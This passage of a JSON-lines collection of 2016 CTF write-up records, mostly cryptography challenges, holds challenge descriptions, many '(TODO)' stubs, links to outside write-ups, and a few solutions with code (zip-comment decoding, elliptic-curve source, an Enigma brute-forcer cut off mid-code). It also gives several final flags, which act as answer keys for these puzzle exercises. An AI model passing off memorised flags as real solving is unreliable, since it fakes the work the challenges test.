{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\securinets-ctf-quals-2016\\crypto\\crypto1-100", "year": "2016", "name": "crypto1-100", "writeup": "# Securinets CTF Quals 2016 : crypto1-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:**\n**Description:**\n\n    qv, sgytx :U !! acg scw xyg udtum nfd !!! htpn'l kigof.\n    nin hvusdky mlv usodhw trth : Maug xltwzv bal ,\n    zv'g zdn mlv uoyt weyv twswn, bx'j c zuce,\n    htvp wf phw cfw kuaf ymef gabymlzpu ;) !\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Soufiane Boussali](https://github.com/MrMugiwara/WriteupsCTF/tree/master/CTFsecuriNets2016)\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\securinets-ctf-quals-2016\\web\\session-hash-400", "year": "2016", "name": "session-hash-400", "writeup": "# Securinets CTF Quals 2016 : session-hash-400\n\n**Category:** Web\n**Points:** 400\n**Solves:** \n**Description:**\n\nI can not wait. I need this treasure\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://ctfsecurinets.github.io/ctf-securinets-quals-2016/web400_session_hash/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\blobfish-340", "year": "2016", "name": "blobfish-340", "writeup": "# Sharif 2016 : blobfish-340\n\n**Category:** Sharif-Ctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> We designed our own proprietary cipher, called Blobfish. We were very proud of it, until someone mounted a chosen-plaintext attack on the cipher, and sent the master key to us. He requested a large amount of money to show us the weakness in Blobfish. Fortunately, we have the queries (plaintexts) he made to our system, as well as the responses (ciphertexts).   Our CEO decided to hire someone less greedy to help us redesign Blobfish. But he must first prove he is worthy. Look at the log, and the cipher design. If you can find the master key, use the function make_flag() on it to generate the flag. Send us the flag, and we'll get back to you for further negotiations.   PS: make_flag() is defined at the end of Blobfish.py. [Download](<http://ctf.sharif.edu/ctf7/api/download/30)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\gcm-magic-260", "year": "2016", "name": "gcm-magic-260", "writeup": "# Sharif 2016 : gcm-magic-260\n\n**Category:** Sharif-Ctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> [GCM Magic](<http://ctf.sharif.edu:8089/)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\lobotomized-lsb-oracle-443", "year": "2016", "name": "lobotomized-lsb-oracle-443", "writeup": "# Sharif 2016 : lobotomized-lsb-oracle-443\n\n**Category:** Sharif-Ctf-2016\n**Points:**\n**Solves:**\n**Description:**\n\n> See the attachment [Download](<http://ctf.sharif.edu/ctf7/api/download/32)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-12-16-sharifctf7/crypto_400_lob_lsb)\n* [LosFuzzys](https://losfuzzys.github.io/writeup/2016/12/18/sharifctf-lsb-oracle-lobotomized/)\n* [irGeeks](https://github.com/irGeeks/ctf/tree/master/2016-SharifCTF7/lobotomized_lsb_oracle)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\lsb-oracle-150", "year": "2016", "name": "lsb-oracle-150", "writeup": "# Sharif 2016 : lsb-oracle-150\n\n**Category:** Sharif-Ctf-2016\n**Points:**\n**Solves:**\n**Description:**\n\n> See the attachment. [Download](<http://ctf.sharif.edu/ctf7/api/download/27)>\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-12-16-sharifctf7/crypto_150_lsb)\n* [LosFuzzys](https://losfuzzys.github.io/writeup/2016/12/18/sharifctf-lsb-oracle/)\n* [irGeeks](https://github.com/irGeeks/ctf/tree/master/2016-SharifCTF7/lsb_oracle)\n* [Capture The Swag](https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\radio-intelligence-680", "year": "2016", "name": "radio-intelligence-680", "writeup": "# Sharif 2016 : radio-intelligence-680\n\n**Category:** Sharif-Ctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> We had an intensive intelligence operation on the enemy radio. We know that they use LPCM with a sample rate of 16 kHz and 16 bits per sample (little endian). Also an LFSR is used for scrambling, with 16 bits or 32 bits of state.  There is an eavesdropping attached. Our agents are sure that it began with saying The flag is, then, there is a delay for one or two seconds, and finally, the flag is said. [Download](<http://ctf.sharif.edu/ctf7/api/download/31)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\tpq-150", "year": "2016", "name": "tpq-150", "writeup": "# Sharif 2016 : tpq-150\n\n**Category:** Sharif-Ctf-2016\n**Points:**\n**Solves:**\n**Description:**\n\n> nc ctf.sharif.edu 4000\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [YoloSw4g](https://github.com/Iansus/writeups/blob/master/2016/SharifCTF7/Crypto-TPQ.md)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\unterscheide-200", "year": "2016", "name": "unterscheide-200", "writeup": "# Sharif 2016 : unterscheide-200\n\n**Category:** Sharif-Ctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> See the attachment [Download](<http://ctf.sharif.edu/ctf7/api/download/27)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "XOR", "path": "data\\write-ups-2016\\sharif-ctf-2016\\crypto\\xor-150", "year": "2016", "name": "xor-150", "writeup": "# Sharif 2016 : xor-150\n\n**Category:** Sharif-Ctf-2016\n**Points:**\n**Solves:**\n**Description:**\n\n> See the attachment. Notice that this is Python 3, and msg is a byte array, not a string. [Download](<http://ctf.sharif.edu/ctf7/api/download/10)>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [dqi](https://github.com/dqi/ctf_writeup/tree/master/2016/sharifctf)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ssctf-2016\\crypto-exploit\\chain-rule-200", "year": "2016", "name": "chain-rule-200", "writeup": "# SSCTF 2016 : Chain Rule 200\n\n**Category:** Crypto-Exploit\n**Points:** 200\n**Solves:** 47\n**Description:**\n\n> è¯¥é¢˜ç›®å·²æœ‰ 47 ä¸ªé˜Ÿä¼å®Œæˆ\n> \n> It has completed by 47 teams\n> \n> è§£é¢˜è¯´æ˜Ž\n> \n> Description\n> \n> \n> Try 'start'\n> \n> æˆ˜é¢˜é“¾æŽ¥ <http://static.lab.seclover.com/crypto/crypto2-b7486602.zip>\n\n\n## Write-up\n\nOne of the files has password \"start\". Inside that file there is text document with another password (that password is unbrutable). Decrypting files one by one gives us 2 zip files: *flag.zip* and *pwd.zip* and message, telling us to look for flag and pwd.\n\n*flag.zip* is password-protected too. *pwd.zip* is unprotected and contains 6140 text files, one is named *start.txt*, and other have numerical names. In every file except the last one there's a link to the next one or two files (\"next is xxxxxx[ , or yyyyyy]\"). Walking through this linked list (using breadth-first search and marking visited files) we visit every file and in the last one we get message, telling us to pay attention to comments and avoid blackhole.\n\nBlackhole is an infinite loop, to which we get if we do not mark visited files. And what comments? There were no comments if the files, except the first and the last one. At the end I found out that most of txt files in *pwd.zip* had a comment inside zip-archive. These comments were \" \" or \"\\t\". If we collect all the comments while walking though the graph, and assume that \" \" == 0 and \"\\t\" == 1, we get a string of bytes in BigEndian:\n\n>b\"\\x01^\\xb8\\x94k\\xe6\\nh\\xf8e\\xcbEIi\\x98s\\xc7\\xad#\\xc6*\\xb7=\\x83U\\x95P\\xeb\\xcd[-\\xf8\\x86\\xf4V\\xc7\\\\#\\x9f&9\\xd0\\xbe\\rrE\\xd57\\xffG\\xb6k\\xb5[\\xe9u.\\x1b\\xf2\\xc2F\\xd5\\x10q\\xf6yt\\x02@\\xd6\\xe6\\x0e\\x91\\xbb\\x95\\xb3u\\x14\\x14B\\xbc\\x1d\\xab/\\xb1\\xbdb\\xbe\\xca\\xe3\\xf7\\x19\\xf7\\xce>\\x0c\\xb4\\xcdsK\\xb9C\\x020\\xe1\\x0c\\x98\\xfc\\xcd\\x8b\\x8f\\xf6\\xdf\\x94\\x01`\\xae\\x92\\xcc\\xfe\\x8d\\xbd\\xb1M\\xdcP\\xe5\\xe1\\x17\\xb7<Z\\xd8_d\\x1c{\\x95XQ\\xd1 \\x903\\n\\xc3\\x08C\\nor\\xf9\\x98)\\x7f\\xeco\\xa6v%\\x11\\xaeRa\\xd9.\\xb2\\xa5\\x8d\\xe2\\xb7\\x88\\x11\\x1d\\xcd\\x15Nhen I am dead, my dearest,\\nSing no sad songs for me;\\nPlant thou no roses at my head,\\nNor shady cypress tree:\\nBe the green grass above me\\nWith showers and dewdrops wet:\\nAnd if thou wilt, remember,\\nAnd if thou wilt, forget.\\n\\npassword part1:Thispasswordistoolong\\n\\nI shall not see the shadows,\\nI shall not see the rain;\\nI shall not hear the nightingle\\nSing on as if in pain:\\nAnd dreaming through the twilight\\nThat doth not rise nor set,\\nHaply I may remember,\\nAnd haply I may forget.\\n\\npassword part2:andyoudon'twanttocrackitbybruteforce\\n\\nThat's all.\"\n\nDecripting *flag.zip* with password: \"Thispasswordistoolongandyoudon'twanttocrackitbybruteforce\" gives us the flag: Flag is SSCTF{Somewhere_Over_The_Rainbow}\n\nPS IMHO this challenge was interesting, but it wasn't crypto at all. The first part was coding, and the second was stego.\n\nCode for getting password from pwd.zip in [chain_rule_2.py](chain_rule_2.py)\n\n## Other write-ups and resources\n\n* none yet\n", "solution_code": "\n# chain_rule_2.py\nimport re\nimport zipfile\n \nnext_file_names = ['start']\nnext_files_re = re.compile(' (?P<next>[0-9]{6})')\nvisited = []\ncommint = 0\n \npwds = zipfile.ZipFile(\"pwd.zip\")\nwhile len(next_file_names):\n    file = next_file_names.pop(0)\n    if file in visited:\n        continue\n    visited.append(file)\n    f = pwds.open(file + '.txt')\n    finfo = pwds.getinfo(file + '.txt')\n    for l in f:\n        if finfo.comment == b' ':\n            commint = (commint << 1)\n        elif finfo.comment == b'\\t':\n            commint = (commint << 1) + 1\n        next_files_searched = next_files_re.findall(l.decode())\n        for nf in next_files_searched:\n            next_file_names.append(nf)\n \nprint(commint.to_bytes(721, byteorder='big'))\nprint(commint.to_bytes(721, byteorder='little'))\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ssctf-2016\\crypto-exploit\\heheda-100", "year": "2016", "name": "heheda-100", "writeup": "# SSCTF 2016 : HeHeDa\n\n**Category:** Crypto-Exploit\n**Points:** 100\n**Solves:** 183\n**Description:**\n\n> è¯¥é¢˜ç›®å·²æœ‰ 183 ä¸ªé˜Ÿä¼å®Œæˆ\n>\n> It has completed by 183 teams\n>\n> è§£é¢˜è¯´æ˜Ž\n>\n> Description\n>\n>\n> Crack Algorithm~\n>\n> æˆ˜é¢˜é“¾æŽ¥ <http://static.lab.seclover.com/crypto/Algorithm1-577265e1.zip>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [RingZer0](https://github.com/tothi/ctfs/tree/master/ssctf-2016/crypto-exploit/heheda-100)\n* <http://abaptista.github.io/2016/02/29/ssctf-writeup/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ssctf-2016\\crypto-exploit\\nonogram-300", "year": "2016", "name": "nonogram-300", "writeup": "# SSCTF 2016 : Nonogram\n\n**Category:** Crypto-Exploit\n**Points:** 300\n**Solves:** 14\n**Description:**\n\n> è¯¥é¢˜ç›®å·²æœ‰ 14 ä¸ªé˜Ÿä¼å®Œæˆ\n> \n> It has completed by 14 teams\n> \n> è§£é¢˜è¯´æ˜Ž\n> \n> Description\n> \n> \n> Game Time Is Coming\n> \n> socket.lab.seclover.com:52700\n> \n> socket2.lab.seclover.com:52700\n> \n> æˆ˜é¢˜é“¾æŽ¥ socket://socket.lab.seclover.com:52700\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ssctf-2016\\crypto-exploit\\pwn-1-400", "year": "2016", "name": "pwn-1-400", "writeup": "# SSCTF 2016 : Pwn-1\n\n**Category:** Crypto-Exploit\n**Points:** 400\n**Solves:** 31\n**Description:**\n\n> è¯¥é¢˜ç›®å·²æœ‰ 31 ä¸ªé˜Ÿä¼å®Œæˆ\n> \n> It has completed by 31 teams\n> \n> è§£é¢˜è¯´æ˜Ž\n> \n> Description\n> \n> \n> The File glibc.so Give You\n> \n> The Rest Depend On You\n> \n> pwn.lab.seclover.com:11111\n> \n> æˆ˜é¢˜é“¾æŽ¥ <http://static.lab.seclover.com/crypto/pwn1-fb39ccfa.zip>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html](http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html)\n* <http://err0r-451.ru/ssctf-crypto-task-1-100pts/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\ssctf-2016\\crypto-exploit\\pwn-2-600", "year": "2016", "name": "pwn-2-600", "writeup": "# SSCTF 2016 : Pwn-2\n\n**Category:** Crypto-Exploit\n**Points:** 600\n**Solves:** 20\n**Description:**\n\n> è¯¥é¢˜ç›®å·²æœ‰ 20 ä¸ªé˜Ÿä¼å®Œæˆ\n> \n> It has completed by 20 teams\n> \n> è§£é¢˜è¯´æ˜Ž\n> \n> Description\n> \n> \n> The File glibc.so Give You\n> \n> The Rest Depend On You\n> \n> pwn.lab.seclover.com:22222\n> \n> æˆ˜é¢˜é“¾æŽ¥ <http://static.lab.seclover.com/crypto/pwn2-58461176.zip>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-600.html](http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-600.html)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\stem-ctf-2016\\crypto\\not-50", "year": "2016", "name": "not-50", "writeup": "# STEM CTF 2016 : not-50\n\n**Category:** Stem-Ctf-2016\n**Points:** 50\n**Solves:**\n**Description:**\n\n> The key is not MCA-3CD9E73E.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://scriptkidd1e.wordpress.com/2016/09/18/mitre-stem-ctf-cyber-challenge-2016/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\british-elevator-350", "year": "2016", "name": "british-elevator-350", "writeup": "# Sharif University CTF 2016 : British Elevator\n\n**Category:** Crypto\n**Points:** 350\n**Solves:** 21\n**Description:**\n\n> p = 16857450949524777441941817393974784044780411511252189319 \n> \n> A = 16857450949524777441941817393974784044780411507861094535 \n> \n> B = 77986137112576 \n> \n> E: y^2 = x^3 + Ax + B over GF(p) \n> \n> P = (5732560139258194764535999929325388041568732716579308775, 14532336890195013837874850588152996214121327870156054248) \n> \n> Q = (2609506039090139098835068603396546214836589143940493046, 8637771092812212464887027788957801177574860926032421582) \n> \n> Q = secret * P \n> \n> flag = secret\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [H4x0rPsch0rr](http://hxp.io/blog/25/)\n* https://gist.github.com/elliptic-shiho/e76e7c2a2aff228d7807\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\hail-zeus-300", "year": "2016", "name": "hail-zeus-300", "writeup": "# Sharif University CTF 2016 : Hail Zeus\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 1\n**Description:**\n\n> Asking Hermes to gath'r intel on the foe, he recover'd the blueprint of their transmitt'r bef're getting captur'd. Itâ€™s been ov'r a month of radio silence. but wait... all hail Zeus, as they restart'd communication when he strok'd them with a lightning:\n>\n> 11111010101010010101011010100011110101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010010110101111111100000111100101010111001010010111011100101111100001101000111111000101100110110011001111001001011101011011110110110101010000101101100001101010111101000010101000001100010111110000011111100100001000111111011010010010010100101011100011000000111001101010000001111111111010000111110001011001010110100001001100010111010101010000001111000011010101010101000011110000110101000111101000011010010010101111100101011111001111010001001101010000000010011000010110000011111000011001100011011001101011001111001001000110111100000101111000100100010100101000111101011011110010010011011110010001000001011101010001000000001100011001110011011100101100010001001001100100011111000011110000001100111011010000010100001100011000101010110010000010001000011100100101100001111100100001010101111010010111010010111100110110110111110100100101100011010000001000000000010000111010001010110111100100100110000100110011011110000010110001111000001111100100111000111011000101010001001111010011110010111000111100100000110000000110101110110001010000011010100001110100100111001110110101111011011111110000100010000101100011101000111100001000001001001100011001000000000100010111000100101101111100100111010000110101010111000010011000100101000101101010110101010010110001100110010110100010010100011011000010010101011100100101000001011001101101000011001010011110100110100000110111000010100010110010011110010010010100010111001111011000010100100111110001011010111011101010001010001101001110100100101001011010010001110110100011100011100000011011001100100100010011000110110000010100100011000111010001011110101001001101010000001110101000011100010110001000111101010000101011000001011101001101000001101000001100010001100100110100100101001010011100000111000011111110000110101101110001011010100001101000011000000110100101101000001011000110111001101001001100010011110010011100000110110100110100011111110101111000001001000011010010001111001011001100101000101111000001101010001100010001100000011000100100101101111110100111011101101101001011000101010010011100010010110010100110011111100000000100001010000000111001010010001111010000001100000001000101001111011101010001111100111101100010110100111100000111011001110100010000010001010110100001100111001001101001001010001011101000011010000011100000001010110101100001011010000110010010101000"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\high-speed-rsa-keygen-150", "year": "2016", "name": "high-speed-rsa-keygen-150", "writeup": "# Sharif University CTF 2016 : High-speed RSA Keygen\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** 25\n**Description:**\n\n> See the attached files.\n> \n> Download [RSA-Keygen.tar.gz](./RSA-Keygen.tar.gz)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Korean](https://github.com/tyhan/CTF/tree/master/SharifCTF2016/High-speed_RSA_Keygen)\n* https://gist.github.com/elliptic-shiho/4e3d6bac91a032cc6f20\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\huge-250", "year": "2016", "name": "huge-250", "writeup": "# Sharif University CTF 2016 : Huge\n\n**Category:** Crypto\n**Points:** 250\n**Solves:** 19\n**Description:**\n\n> Bigger, Not Better\n> \n> Download [huge.tar.gz](./huge.tar.gz)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://gist.github.com/elliptic-shiho/4d94141acf5054af90f6\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\rail-fence-cipher-50", "year": "2016", "name": "rail-fence-cipher-50", "writeup": "# Sharif University CTF 2016 : Rail Fence Cipher\n\n**Category:** Crypto\n**Points:** 50\n**Solves:** 319\n**Description:**\n\n> Decrypt and find the flag.\n>\n> Download [Ciphertext](./Ciphertext)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/SharifCTF/Cryp1>\n* <https://www.youtube.com/watch?v=am-psraHQYw&feature=youtu.be>\n* [0x90r00t](https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-crypto-50-rail-fence-cipher-write-up/)\n* <http://cafelinux.info/articles/writeups-sharifctf-2016-rail-fence-cipher-crypto-50#ENG>\n* <http://err0r-451.ru/sharifctf-crypto-railfencecipher-50pts/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\smooth-as-silk-200", "year": "2016", "name": "smooth-as-silk-200", "writeup": "# Sharif University CTF 2016 : Smooth As Silk\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 11\n**Description:**\n\n> p > q \n> \n> n = p*q = 11461532818525251775869994369956628325437478510485272730419843320517940601808597552925629451795611990372651568770181872282590309894187815091191649914833274805419432525386234876477307472337026966745408507004000948112191973777090407558162018558945596691322909404307420094584606103206490426551745910268138393804043641876816598599064856358266650339178617149833032309379858059729179857419751093138295863034844253827963\n> \n> flag = md5(str(p))\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <http://www.cnblogs.com/Christmas/p/5185512.html>\n* <https://github.com/BatmansKitchen/ctf-writeups/tree/master/2016-sharifctf>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\the-russian-attack-500", "year": "2016", "name": "the-russian-attack-500", "writeup": "# Sharif University CTF 2016 : The Russian Attack\n\n**Category:** Crypto\n**Points:** 500\n**Solves:** 4\n**Description:**\n\n> See the attached file\n> \n> Download [russian-attack.tar.gz](./russian-attack.tar.gz)\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\su-ctf-2016\\crypto\\ure-100", "year": "2016", "name": "ure-100", "writeup": "# Sharif University CTF 2016 : URE\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 70\n**Description:**\n\n> Universal ReEncryption <http://ctf.sharif.edu:34455/chal/URE/720a20f3bea9892f/>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [0x90r00t](https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-crypto-100-rail-fence-cipher-write-up/)\n* [Korean](https://github.com/tyhan/CTF/tree/master/SharifCTF2016/URE)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\cipher-font-50", "year": "2016", "name": "cipher-font-50", "writeup": "# tjctf-2016 : cipher-font-50\n\n**Category:** Web**Points:** 50\n**Description:** This webpage contains a flag!\n\n## Write-up\n\nBy attempting to copy and paste the text displayed on the webpage, it is obvious the displayed characters are not the true text of the page. However, upon closer inspection, each displayed character represents a single text character. For example, the actual character '(' is - as a result of the font - displayed as a 'w'. Following the same pattern, the actual character '[' is displayed as 'L'. The fastest  way to decrypt this large chunk of text would be to write a program that substitutes characters from the copied text to the character they display as. Pasting the text from the page into the program and having it substitute characters would produce you with a string identical to that which is displayed on the challenge's web page. Then, before your program ends, have it print out that new string hashed with MD5. Last, surround that hash value with the traditional tjctf{} format and you will end up with `tjctf{232bd3180db2e7261ad2d94b725c9008}`\n\n## Other write-ups and resources\n\n* [MilWestA - CTFtime.org](https://ctftime.org/writeup/3451)\n* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/cipher_font_50_pts.html)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\curvature-200", "year": "2016", "name": "curvature-200", "writeup": "# tjctf-2016 : curvature-200\n\n**Category:** Cryptography\n**Points:** 200\n**Description:** curvature2.py\n\n## Write-up\n\n(TODO)\n`tjctf{oops_ell1pt1c_curves_R_h4rd}``\n\n## Other write-ups and resources\n\n* [My Computer is a Potato - gitbooks.io](https://bobacadodl.gitbooks.io/tjctf-2016-writeups/content/curvature2_200_pts.html)\n", "solution_code": "\n# curvature2.py\nfrom flag import FLAG\nFLAG = int(FLAG.encode('hex'),16)\n\nP = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b\nA = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07\nGx = 0xcf634030986cf41c1add87e71d638b9cc723c764059cf4c9b8ed2a0aaf5d51dc770372503ebfaad746ab9220e992c09822916978226465ad31d354a3efee51da\nGy = 0x65eaad8848b2787103fce02358b45d8a61420031989eb6b4b70d82fe20d85583ae542eb8f76749dc640b0f13f682228819b8b2f04bd7a5a17a4c675540fe1c90\n\nassert FLAG < P\n\ndef egcd(a, b):\n    x,y, u,v = 0,1, 1,0\n    while a != 0:\n        q, r = b//a, b%a\n        m, n = x-u*q, y-v*q\n        b,a, x,y, u,v = a,r, u,v, m,n\n    gcd = b\n    return gcd, x, y\n\ndef inv(a):\n    gcd, x, y = egcd(a % P, P)\n    if gcd != 1:\n        return -1\n    else:\n        return x % P\n\ndef add(a, b):\n    if a == 0:\n        return b\n    if b == 0:\n        return a\n    i = inv(b[0] - a[0])\n    if i == -1:\n        return 0\n    l = ((b[1] - a[1]) * i) % P\n    x = (l*l - a[0] - b[0]) % P\n    y = (l*(a[0] - x) - a[1]) % P\n    return (x,y)\n\ndef double(a):\n    if a == 0:\n        return a\n    i = inv(2*a[1])\n    if i == -1:\n        return 0\n    l = ((3*a[0]*a[0] + A) * i) % P\n    x = (l*l - 2*a[0]) % P\n    y = (l*(a[0] - x) - a[1]) % P\n    return (x,y)\n\ndef multiply(point, exponent):\n    r0 = 0\n    r1 = point\n    for i in bin(exponent)[2:]:\n        if i == '0':\n            r1 = add(r0, r1)\n            r0 = double(r0)\n        else:\n            r0 = add(r0, r1)\n            r1 = double(r1)\n    return r0\n\nprint(multiply((Gx,Gy),FLAG))\n\n# Output:\n# (10150325274093651859575658519947563789222194633356867789068177057343771571940302488270622886585658965620106459791565259790154958179860547267338437952379763L, 6795014289013853849339410895464797184780777251924203530417684718894057583288011725702609805686960505075072642102076744937056900144377846048950215257629102L)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\tjctf-2016\\crypto\\financial-transaction-60", "year": "2016", "name": "financial-transaction-60", "writeup": "# tjctf-2016 : financial-transaction-60\n\n**Category:** Cryptography\n**Points:** 60\n**Description:** The History Museum sent us some money and encrypted the transfer using an Enigma Machine. Unfortunately, we were unable to decrypt the cipher and retrieve the money. Can you help us out? This is all we have.\n\n## Write-up\n\nBased on the architecture of the enigma, and the amount of information given to us about the configuration, it's best to just try a brute force decryption. Here's a modified simulation script used to brute force it:\n\n```C\n#include <stdio.h>\n#define MSGLEN 80\n#define TO 'A'\n/* Rotor wirings */\nchar rotor[5][26]={\n    /* Input \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" */\n    /* 1: */ \"EKMFLGDQVZNTOWYHXUSPAIBRCJ\",\n    /* 2: */ \"AJDKSIRUXBLHWTMCQGZNPYFVOE\",\n    /* 3: */ \"BDFHJLCPRTXVZNYEIWGAKMUSQO\",\n    /* 4: */ \"ESOVPZJAYQUIRHXLNFTGKDCMWB\",\n    /* 5: */ \"VZBRGITYUPSDNHLXAWMJQOFECK\" };\nchar ref[26]=\"YRUHQSLDPXNGOKMIEBFZCWVJAT\";\nchar notch[5]=\"QEVJZ\";\n/* Encryption parameters follow */\ntypedef struct P\n{\n  char order[3];/*={ 1, 2, 3 };*/\n  char rings[3];/*={ 'A','A','A' };*/\n  char pos[3];/*={ 'A','A','A' };*/\n  char plug[10];/*=\"AMTE\";*/\n} Params;\n/*take a char and return its encoded version according to the\n  encryption params, update params, i.e. advance wheels\n  this part uses Fauzan Mirza's code*/\nchar scramble(char c, Params *p)\n{\n  int i, j, flag = 0;\n        c=toupper(c);\n        if (!isalpha(c))\n            return -1;\n        /* Step up first rotor */\n        p->pos[0]++;\n        if (p->pos[0]>'Z')\n            p->pos[0] -= 26;\n        /* Check if second rotor reached notch last time */\n        if (flag)\n        {\n            /* Step up both second and third rotors */\n            p->pos[1]++;\n            if (p->pos[1]>'Z')\n                p->pos[1] -= 26;\n            p->pos[2]++;\n            if (p->pos[2]>'Z')\n                p->pos[2] -= 26;\n            flag=0;\n        }\n        /*  Step up second rotor if first rotor reached notch */\n        if (p->pos[0]==notch[p->order[0]-1])\n        {\n            p->pos[1]++;\n            if (p->pos[1]>'Z')\n                p->pos[1] -= 26;\n            /* Set flag if second rotor reached notch */\n            if (p->pos[1]==notch[p->order[1]-1])\n                flag=1;\n        }\n        /*  Swap pairs of letters on the plugboard */\n        for (i=0; p->plug[i]; i+=2)\n        {\n            if (c==p->plug[i])\n                c=p->plug[i+1];\n            else if (c==p->plug[i+1])\n                c=p->plug[i];\n        }\n        /*  Rotors (forward) */\n        for (i=0; i<3; i++)\n        {\n            c += p->pos[i]-'A';\n            if (c>'Z')\n                c -= 26;\n            c -= p->rings[i]-'A';\n            if (c<'A')\n                c += 26;\n            c=rotor[p->order[i]-1][c-'A'];\n            c += p->rings[i]-'A';\n            if (c>'Z')\n                c -= 26;\n            c -= p->pos[i]-'A';\n            if (c<'A')\n                c += 26;\n        }\n        /*  Reflecting rotor */\n        c=ref[c-'A']"}
